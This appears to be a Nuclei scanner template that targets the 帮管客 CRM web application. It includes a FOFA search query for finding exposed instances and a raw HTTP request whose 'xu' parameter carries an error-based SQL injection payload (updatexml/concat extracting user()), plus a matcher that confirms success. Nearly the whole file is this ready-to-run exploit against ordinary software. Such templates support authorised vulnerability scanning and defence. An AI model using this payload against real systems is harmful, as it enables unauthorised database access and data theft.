id: CRM-jiliyu-SQL

info:
  name: CRM-jiliyu-SQL
  author: lengmo
  severity: high
  description: CRM-jiliyu-SQL
  tags: sqli
  metadata:
    fofa-qeury: app="帮管客-CRM"
    veified: true
    max-request: 1

http:
  - raw:
      - |
        GET /index.php/jiliyu?keyword=1&page=1&pai=id&sou=soufast&timedsc=激励语列表&xu=and%201=(updatexml(1,concat(0x7e,(select%20user()),0x7e),1)) HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close

               
    matchers:     
      - type: dsl
        dsl:
          - "status_code_1 == 500 && contains(body,'localhost')" 